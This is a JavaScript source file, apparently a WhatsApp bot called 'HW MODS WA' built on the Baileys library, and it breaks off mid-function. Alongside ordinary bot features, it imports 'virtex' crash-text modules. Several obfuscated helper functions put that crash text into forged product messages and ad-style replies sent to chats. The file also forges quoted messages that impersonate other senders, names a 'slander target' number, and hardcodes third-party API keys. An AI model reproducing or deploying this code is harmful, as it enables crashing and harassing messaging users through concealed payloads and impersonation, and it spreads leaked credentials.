// [❗] HW MODS WA
// [❗] MAU REMOD YAH
// [❗] HAHAHAHAHAHA :)
const
{
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
MimetypeMap,
WALocationMessage,
ChatModification,
WA_MESSAGE_STUB_TYMap,
WA_DEFAULT_EPHEMERAL,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
waChatKey,
mentionedJid,
processTime
} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const cheerio = require("cheerio");
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const fsx = require("fs-extra")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const hx = require('hxz-api')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const imgbb = require('imgbb-uploader')
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const mathjs = require('mathjs')
const toHur = require('@develoka/angka-terbilang-js')
const { jadibot, stopjadibot } = require('./jadibot.js')
const { error } = require("qrcode-terminal")
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
//=================================================//
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { virtex7 } = require('./virtex/virtex7')
//=================================================//
const Mthumb = fs.readFileSync('./media/image/thumb.jpeg')
const Mfake = fs.readFileSync ('./media/image/fake.jpeg')
const Bthumb = fs.readFileSync('./media/image/thumb.jpeg','base64')
const Bfake = fs.readFileSync ('./media/image/fake.jpeg','base64')
//=================================================//
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, } = require('./lib/fetcher')
const { yta, ytv, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const { pinterest } = require('./lib/pinterest')
const Exif = require('./lib/exif')
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const setTtt = require('./lib/tictactoe.js')
const ph = require('./lib/photooxy.js')
const { lirikLagu } = require('./lib/lirik.js')
const { virtex, vipi } = require('./lib/virtex.js')
//=================================================//
const { emoji2 } = require('./database/emoji2')
const { virtext } = require('./database/virtext')
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const afk = JSON.parse(fs.readFileSync('./database/off.json'))
const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
const _win = JSON.parse(fs.readFileSync('./database/tttwin.json'))
const banUser = JSON.parse(fs.readFileSync('./database/banned.json'))
const _lose = JSON.parse(fs.readFileSync('./database/tttlose.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const ntilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
//=================================================//
banChats = true // Self and Public ( HW MODS WA )
bugc = true // Antibug Gc ( HW MODS WA & HAIKALMODS )
antitrol = true // Antifake Trolli ( HW MODS WA )
offline = false // Offline and Online ( HAIKAL )
const exif = new Exif()
multi = true // Multi Prefix ( HW MODS WA )
antitags = true // Antitag ( HW MODS WA )
readG = true // Auto Read Group ( HW MODS WA )
readP = false // Auto Read Private ( HW MODS WA )
winawal = 1 // Win Tictactoe ( HW MODS WA )
loseawal = 1 // Lose Tictactoe ( HW MODS WA )
memberwin = 1 // Win ( HW MODS WA )
memberlose = 1 // Lose ( HW MODS WA )
pref = '?' // Prefix ( HW MODS WA )
fake1 = '©[XM]-[XHIRO MHONSHINE] ✌️'
targetpc = '6285714170944' // Fitnah Target ( HAIKAL )
owner = '6285714170944' // Numbers Owner ( HW MODS WA )
ownerNumbers = ["6285714170944@s.whatsapp.net","6285714170944@s.whatsapp.net","6285714170944@s.whatsapp.net"]
linkcom = ".com" // Anti Link ( HW MODS WA )
linkid = ".id" // Anti Link ( HW MODS WA )
linkxyz = ".xyz" // Anti Link ( HW MODS WA )
linkly = ".ly" // Anti Link ( HW MODS WA )
linkhttp = "http" // Anti Link ( HW MODS WA )
linkwa = "://chat.whatsapp.com" // Anti Link Group Whatsapp ( HW MODS WA )
deflt = "..........c.....com" // Default Link ( HW MODS WA )
linknye = `${deflt}` // Anti Link ( HW MODS WA )
fake = 'HW MODS WA' // Fake Text Reply / Name Bot ( HW MODS WA )
a = '```' // Font Whatsapp ( HW MODS WA )
bailver = '3.5.2' // Versi Baileys ( HW MODS WA )
botver = '1.0.0' // Versi Bot ( HW MODS WA )
numbernye = '0' // Whatsapp Numbers ( HAIKAL )
waktu = '-' // Waktu Fiturs Online / Offline ( HAIKAL )
alasan = '-' // Alasan Fiturs Online / Offline ( HAIKAL )
ownerNumber = [`${owner}@s.whatsapp.net`] // Numbers Owner ( HAIKAL )
const X = "❌" // Tictactoe ( HW MODS WA & Lolhuman )
const O = "⭕️" // Tictactoe ( HW MODS WA & Lolhuman )
const tunjuk = "👈" // Tictactoe ( HW MODS WA & Lolhuman )
lolkey = '511fc49c7ad4edcecf8653cf' //Lolhuman
xteam = 'edd4e2b682326371'
lolkey = '682aeab645ed61cf137cf971'
HunterApi = 'Ikyy69'
lolhuman = 'lolhuman'
//=================================================//
const getWins = (sender, total) => {
            let position = false
            Object.keys(_win).forEach((i) => {
                if (_win[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _win[position].win -= total
                 fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
            }
        } 
const getLose = (sender, total) => {
            let position = false
            Object.keys(_lose).forEach((i) => {
                if (_lose[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _lose[position].lose -= total
                 fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
            }
        }
//=================================================//        
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}
const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}
const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
//=================================================//

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
                                         }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
                                         }
//=================================================//

module.exports = Haikal = async (Haikal, kal) => {
	try {
if (!kal.hasNewMessage) return
kal = kal.messages.all()[0]
if (!kal.message) return
if (kal.key && kal.key.remoteJid == 'status@broadcast') return
if ((Object.keys(kal.message)[0] === 'ephemeralMessage' && JSON.stringify(kal.message).includes('EPHEMERAL_SETTING')) && kal.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (kal.key.fromMe) return
nums = kal.participant
longkapnye = "\n".repeat(420)
tekuss = `© HW MODS WA 2021${longkapnye}\`\`\`BUGGC TERDETEKSI\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by HW MODS_\n*Jangan maen bug tod*`
Haikal.groupRemove(kal.key.remoteJid, [nums]).catch((e) => { freply(`*ERR:* ${e}`) })
Haikal.sendMessage(kal.key.remoteJid, 'WAH BUG NIH', MessageType.text)
Haikal.sendMessage(kal.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}
//=================================================//
                global.blocked
                m = simple.smsg(Haikal, kal)
        	kal.message = (Object.keys(kal.message)[0] === 'ephemeralMessage') ? kal.message.ephemeralMessage.message : kal.message
    const content = JSON.stringify(kal.message)
		const from = kal.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeJak = moment.tz('Asia/Jakarta').format("HH:mm:ss");
		const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
    const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
    const type = Object.keys(kal.message)[0]        
    const cmd = (type === 'conversation' && kal.message.conversation) ? kal.message.conversation : (type == 'imageMessage') && kal.message.imageMessage.caption ? kal.message.imageMessage.caption : (type == 'videoMessage') && kal.message.videoMessage.caption ? kal.message.videoMessage.caption : (type == 'extendedTextMessage') && kal.message.extendedTextMessage.text ? kal.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(kal.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(kal.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(kal.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
//=================================================//
                if (multi){
                   // var prefix = ''
                   var prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        	    } else {
        	    prefix = pref
        	    }
//=================================================//        	    
        body = (type === 'conversation' && kal.message.conversation.startsWith(prefix)) ? kal.message.conversation : (type == 'imageMessage') && kal.message.imageMessage.caption.startsWith(prefix) ? kal.message.imageMessage.caption : (type == 'videoMessage') && kal.message.videoMessage.caption.startsWith(prefix) ? kal.message.videoMessage.caption : (type == 'extendedTextMessage') && kal.message.extendedTextMessage.text.startsWith(prefix) ? kal.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(kal.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(kal.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(kal.message.stickerMessage.fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? kal.message.conversation : (type === 'extendedTextMessage') ? kal.message.extendedTextMessage.text : ''
//=================================================//
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
    const q = args.join(' ')
    const timestamp = speed();
    const latensi = speed() - timestamp
		const run = process.uptime()
		const botNumber = Haikal.user.jid
		const botNumberss = Haikal.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? kal.participant : kal.key.remoteJid
		const senderNumber = sender.split("@")[0]
	  const isBan = banUser.includes(sender)
    const isOwner = ownerNumbers.includes(sender)
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Haikal.user.phone
		const totalchat = await Haikal.chats.all()
		const totalgroup = await Haikal.chats.array.filter(v => v.jid.endsWith('g.us'))
    const totalkontak = await Haikal.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        isStc = Object.keys(kal.message)[0] == "stickerMessage" ? kal.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
	      const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	      const isStcVideo = isStcMedia && content.includes("videoMessage")
  	    const isStcImage = isStcMedia && content.includes("imageMessage")
  	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
		const groupMetadata = isGroup ? await Haikal.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isNsfw = isGroup ? nsfww.includes(from) : false
  	const isMuted = isGroup ? mute.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const AntiLink = isGroup ? ntilink.includes(from) : false    
    const conts = kal.key.fromMe ? Haikal.user.jid : Haikal.contacts[sender] || { notify: jid.replace(/@.+/, '') }
    const pushname = kal.key.fromMe ? Haikal.user.name : conts.notify || conts.vname ||  conts.name || '-'
    const atibot = m.isBaileys                
//=================================================//        
const mess = {
   "wait": "```⊷️「  Wait 」```",
   " Success": "```⊷️「 Success 」```",
   "wrongFormat": "```⊷️「 Format is wrong 」```",
   "error": {
   "stick": "```⊷️「 Sticker Only 」```",
   "lv": "```⊷️「 Error 」```",
   "api": "```⊷️「 Error 」```"
   },
    "only": {
    "group": "```⊷️「 Group Only 」```",
    "pribadi": "```⊷️「 Private Only 」```"
   },
   "ban": "```⊷️「 You Are Banned 」```"
}
//=================================================//        
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        
        const reply = (teks) => {
            Haikal.sendMessage(from, teks, text, {quoted:ikal})
        }
//=================================================// 
        const bct = (teks) => {
            Haikal.sendMessage(from, teks, text, {quoted:kal, contextInfo:{"externalAdReply":{"title": fake,"body": `Sc Ori Hw Mods`,"previewType": "PHOTO","thumbnailUrl": `https://cdn.pixabay.com/photo/2021/10/14/15/42/15-42-34-820_640.jpg`,"thumbnail": Mthumb,"sourceUrl": `https://duit.cc/AaPnL7`}}})
        }
//=================================================//        
        function _0x45c5(){const _0x5162cc=['21463629RaVwPb','sendMessage','187184AxxzzX','21ZNOyIH','638SNzHNY','4390590EGLNXC','readFileSync','PHOTO','16pWfEps','https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg','114255VecIGB','https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g/','916992WJIgbM','1103015GTHgWu','3791bUJYVa','30LHcwgo'];_0x45c5=function(){return _0x5162cc;};return _0x45c5();}(function(_0x5de27d,_0x2e81a2){const _0x20e84a=_0x3a8a,_0x5b3658=_0x5de27d();while(!![]){try{const _0x58fe9f=-parseInt(_0x20e84a(0x172))/0x1*(-parseInt(_0x20e84a(0x168))/0x2)+parseInt(_0x20e84a(0x170))/0x3*(parseInt(_0x20e84a(0x16c))/0x4)+-parseInt(_0x20e84a(0x171))/0x5+parseInt(_0x20e84a(0x169))/0x6+parseInt(_0x20e84a(0x167))/0x7*(-parseInt(_0x20e84a(0x166))/0x8)+-parseInt(_0x20e84a(0x16e))/0x9*(parseInt(_0x20e84a(0x163))/0xa)+-parseInt(_0x20e84a(0x164))/0xb;if(_0x58fe9f===_0x2e81a2)break;else _0x5b3658['push'](_0x5b3658['shift']());}catch(_0x383463){_0x5b3658['push'](_0x5b3658['shift']());}}}(_0x45c5,0xd7bad));function _0x3a8a(_0x4d95af,_0x3bf738){const _0x45c5dd=_0x45c5();return _0x3a8a=function(_0x3a8ae9,_0x3a0156){_0x3a8ae9=_0x3a8ae9-0x163;let _0x491d72=_0x45c5dd[_0x3a8ae9];return _0x491d72;},_0x3a8a(_0x4d95af,_0x3bf738);}const kalkal=_0x260934=>{const _0x3b5cf1=_0x3a8a;Haikal[_0x3b5cf1(0x165)](from,_0x260934,text,{'quoted':kal,'contextInfo':{'externalAdReply':{'title':fake,'body':''+ngazap(prefix),'previewType':_0x3b5cf1(0x16b),'thumbnailUrl':_0x3b5cf1(0x16d),'thumbnail':fs[_0x3b5cf1(0x16a)]('./stik/Ahhikal.jpeg'),'sourceUrl':_0x3b5cf1(0x16f)}}});};
//=================================================//        
        function _0x4759(_0x1321b5,_0x377c89){const _0x170624=_0x1706();return _0x4759=function(_0x475936,_0x364149){_0x475936=_0x475936-0x10b;let _0x3bbc84=_0x170624[_0x475936];return _0x3bbc84;},_0x4759(_0x1321b5,_0x377c89);}(function(_0x139619,_0x21de0c){const _0x4d2f91=_0x4759,_0x2fa32f=_0x139619();while(!![]){try{const _0x27f534=-parseInt(_0x4d2f91(0x118))/0x1+parseInt(_0x4d2f91(0x10c))/0x2+-parseInt(_0x4d2f91(0x11a))/0x3*(parseInt(_0x4d2f91(0x114))/0x4)+parseInt(_0x4d2f91(0x10d))/0x5*(-parseInt(_0x4d2f91(0x113))/0x6)+parseInt(_0x4d2f91(0x10f))/0x7*(-parseInt(_0x4d2f91(0x119))/0x8)+parseInt(_0x4d2f91(0x116))/0x9+parseInt(_0x4d2f91(0x117))/0xa;if(_0x27f534===_0x21de0c)break;else _0x2fa32f['push'](_0x2fa32f['shift']());}catch(_0x39ca2d){_0x2fa32f['push'](_0x2fa32f['shift']());}}}(_0x1706,0x3bf7e));const freply=_0x45010e=>{const _0x1dd552=_0x4759;Haikal[_0x1dd552(0x10b)](from,_0x45010e,text,{'quoted':kal,'contextInfo':{'externalAdReply':{'title':fake,'body':_0x1dd552(0x10e),'previewType':'PHOTO','thumbnailUrl':_0x1dd552(0x115),'thumbnail':fs[_0x1dd552(0x111)](_0x1dd552(0x110)),'sourceUrl':_0x1dd552(0x11b)}}});},kalot=_0x1fd17f=>{const _0x34bd9c=_0x4759;Haikal['sendMessage'](from,_0x1fd17f,text,{'quoted':kal,'contextInfo':{'externalAdReply':{'title':fake,'body':_0x34bd9c(0x112)+virtext,'previewType':'PHOTO','thumbnailUrl':_0x34bd9c(0x115),'thumbnail':fs[_0x34bd9c(0x111)]('./stik/Ahhikal.jpeg'),'sourceUrl':'https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g/'}}});};function _0x1706(){const _0x3bb27c=['HW\x20MODS\x20WA','325224HGXRZo','24XSbpmC','https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg','481149HvCNDl','16212390kieEEc','455554qEUlKS','125128SnMOKO','227235jZLnEG','https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g/','sendMessage','54620TRGCbh','10RGPCbK','Subscribe\x20HW\x20MODS\x20WA','196KCOtHj','./stik/Ahhikal.jpeg','readFileSync'];_0x1706=function(){return _0x3bb27c;};return _0x1706();}
//=================================================//
        const sendMess = (hehe, teks) => {
            Haikal.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? Haikal.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Haikal.sendMessage(from, teks.trim(), extendedText, { quoted: ikal, contextInfo: { "mentionedJid": memberr } })
        }        
//=================================================//        
        const fakestatus = (teks) => {
            Haikal.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "34699303450-1355008702@g.us" } : {}) 
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": Mthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
//=================================================//        
        const fakethumb = (teks, yes) => {
            Haikal.sendMessage(from, teks, image, {thumbnail:Mfake,quoted:ikal,caption:yes})
        }
//=================================================//        
const fekekal = (teks, yes) => {        	
Haikal.sendMessage(from,teks,image,{mimetype: Mimetype.fekekal,quoted : ikal, thumbnail: fs.readFileSync('./stik/deden.jpeg')})            
        }         
        const fakegroup = (teks) => {
            Haikal.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "34699303450-1355008702@g.us" } : {}) 
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": Mthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
//=================================================//        
        	        			   function _0x5473(_0x1507d5,_0xe1cbf4){const _0x5f50a9=_0x5f50();return _0x5473=function(_0x5473da,_0x52596d){_0x5473da=_0x5473da-0x18f;let _0x3fa51c=_0x5f50a9[_0x5473da];return _0x3fa51c;},_0x5473(_0x1507d5,_0xe1cbf4);}(function(_0x8e6bbc,_0x444457){const _0x3dbb1c=_0x5473,_0x1f7b5e=_0x8e6bbc();while(!![]){try{const _0x10a793=-parseInt(_0x3dbb1c(0x1a6))/0x1*(parseInt(_0x3dbb1c(0x195))/0x2)+-parseInt(_0x3dbb1c(0x1a7))/0x3+-parseInt(_0x3dbb1c(0x198))/0x4+parseInt(_0x3dbb1c(0x18f))/0x5+-parseInt(_0x3dbb1c(0x194))/0x6*(-parseInt(_0x3dbb1c(0x19f))/0x7)+parseInt(_0x3dbb1c(0x1a0))/0x8*(-parseInt(_0x3dbb1c(0x192))/0x9)+parseInt(_0x3dbb1c(0x1a1))/0xa;if(_0x10a793===_0x444457)break;else _0x1f7b5e['push'](_0x1f7b5e['shift']());}catch(_0x566bb5){_0x1f7b5e['push'](_0x1f7b5e['shift']());}}}(_0x5f50,0x821f6));function _0x5f50(){const _0x17bb9c=['HW\x20MODS\x20WA\x20🔥➥','4383282311765462','4582655NciGgp','IobngdpcCoKqVw5NujZp5OxVA+hmNBZ4+Me5HSIrByM=','prepareMessageFromContent','1368999TRQVbT','IDR','913938FFfvvp','852FesSgR','-999999999999','©XM\x20XHIRO\x20MHONSHINE','4039964lERurd','62857141709445@s.whatsapp.net','image/jpeg','http://hwmodswa.website2.me/','readFileSync','/v/t62.7118-24/33362654_2985464461692539_2232039221222414383_n.enc?ccb=11-4&oh=04aaa9547f1816b97a8f2748c500575a&oe=616BD2B0&_nc_hot=1632065864','FUFjdWbXsYPQpWnBa9uKLFAArCZHWBDHyzSXdEgJa1z4W051Vsv2+Q==','7LesmqI','8oKJQiO','11527690vaDhSv','99999999999000','1631953433','75322','./stik/fake.jpeg','269ttGfaf','1235835VFfFLR'];_0x5f50=function(){return _0x17bb9c;};return _0x5f50();}const hwgans=(_0x47a146,_0x4e1751,_0x593c0d)=>{const _0x340e0c=_0x5473;res=Haikal[_0x340e0c(0x191)](from,{'productMessage':{'product':{'productImage':{'url':'https://mmg.whatsapp.net/d/f/AhKiA8ZYMvh7bmeduarnW7bNy_b7iSQmhpFWGWP8gn9W.enc','mimetype':_0x340e0c(0x19a),'fileSha256':'qaHI3/usbupEbhnoAoeUdmJcvt6OpCH4c3L+k1+dVFU=','fileLength':_0x340e0c(0x1a4),'height':0x3e8,'width':0x3e8,'mediaKey':'4bkOcwD7n4exarKEUz9QCe6C69CiCVTjuAxfUr55Hlw=','fileEncSha256':'o8WVAUEap+pZ9guBSEp8v02r37yPjZx646NfUU2qkc0=','directPath':_0x340e0c(0x19d),'mediaKeyTimestamp':_0x340e0c(0x1a3),'jpegThumbnail':fs[_0x340e0c(0x19c)](_0x340e0c(0x1a5)),'scansSidecar':_0x340e0c(0x19e),'scanLengths':[0x2946,0x7782,0x3290,0x52e2],'midQualityFileSha256':_0x340e0c(0x190)},'productId':_0x340e0c(0x1a9),'title':_0x340e0c(0x1a8),'description':_0x340e0c(0x197)+ngazap(prefix),'currencyCode':_0x340e0c(0x193),'itemCount':_0x4e1751,'message':_0x47a146,'priceAmount1000':_0x340e0c(0x1a2),'retailerId':_0x340e0c(0x196),'url':_0x340e0c(0x19b),'productImageCount':0x1,'salePriceAmount1000':'0'},'businessOwnerJid':_0x340e0c(0x199),'contextInfo':{'forwardingScore':0x3e7,'isForwarded':!![]}}},{'quoted':_0x593c0d,'contextInfo':{}}),Haikal['relayWAMessage'](res);};
//=================================================//        
        const _0x23aeb4=_0x581c;function _0x4d96(){const _0x1752af=['1187076ARTnPN','596frGmoI','4433355RlEHat','3EB0382EDBB2','114jCysUl','0@s.whatsapp.net','©[HW]-[XM]\x20✌️','6285714170944@s.whatsapp.net','2hdbSkY','1619416yoghOo','20690OHYlYK','1320beLvRZ','533909HsMdrt','94370BHhFcq','34699303450-1355008702@g.us','88298fmjoVJ'];_0x4d96=function(){return _0x1752af;};return _0x4d96();}(function(_0x1c2ced,_0x45af09){const _0x49e8c4=_0x581c,_0x84e1da=_0x1c2ced();while(!![]){try{const _0xadfc04=parseInt(_0x49e8c4(0x1bd))/0x1*(parseInt(_0x49e8c4(0x1b9))/0x2)+parseInt(_0x49e8c4(0x1c1))/0x3+-parseInt(_0x49e8c4(0x1c2))/0x4*(parseInt(_0x49e8c4(0x1bb))/0x5)+-parseInt(_0x49e8c4(0x1c5))/0x6*(parseInt(_0x49e8c4(0x1c0))/0x7)+-parseInt(_0x49e8c4(0x1ba))/0x8+-parseInt(_0x49e8c4(0x1c3))/0x9+parseInt(_0x49e8c4(0x1be))/0xa*(parseInt(_0x49e8c4(0x1bc))/0xb);if(_0xadfc04===_0x45af09)break;else _0x84e1da['push'](_0x84e1da['shift']());}catch(_0xa82020){_0x84e1da['push'](_0x84e1da['shift']());}}}(_0x4d96,0x7cb47));function _0x581c(_0x7ef1fb,_0x57f924){const _0x4d9602=_0x4d96();return _0x581c=function(_0x581c37,_0x4a7617){_0x581c37=_0x581c37-0x1b6;let _0x28a176=_0x4d9602[_0x581c37];return _0x28a176;},_0x581c(_0x7ef1fb,_0x57f924);}const ikal={'key':{'fromMe':![],'participant':_0x23aeb4(0x1b6),...from?{'remoteJid':_0x23aeb4(0x1bf)}:{}},'message':{'extendedTextMessage':{'text':_0x23aeb4(0x1b7),'previewType':'NONE','contextInfo':{'stanzaId':_0x23aeb4(0x1c4),'participant':_0x23aeb4(0x1b8)}}}};
//=================================================//					
			    function _0x39ac(){const _0x226150=['HAIKAL','prepareMessageFromContent','INQUIRY','422590gFPhTg','./stik/deden.jpeg','62857141709445@s.whatsapp.net','1103820vseLGG','readFileSync','IDR','AR61RMqVJpKRQHFFHOa8MKYHLneV6TXIjCc6e5rmqZgD+A==','1651960TMYjyC','305490JTzeKn','9899999999901000','CATALOG','relayWAMessage','6lOHOln','4UQRblC','144900UpiSzv','60399YkSiOW','224LKxFcX','90952jVBoVq'];_0x39ac=function(){return _0x226150;};return _0x39ac();}function _0x2d7a(_0x4b1e5a,_0x356bfe){const _0x39ac52=_0x39ac();return _0x2d7a=function(_0x2d7a43,_0x5966a8){_0x2d7a43=_0x2d7a43-0x98;let _0x370906=_0x39ac52[_0x2d7a43];return _0x370906;},_0x2d7a(_0x4b1e5a,_0x356bfe);}(function(_0x36ec89,_0x3f37db){const _0x19ecea=_0x2d7a,_0x256117=_0x36ec89();while(!![]){try{const 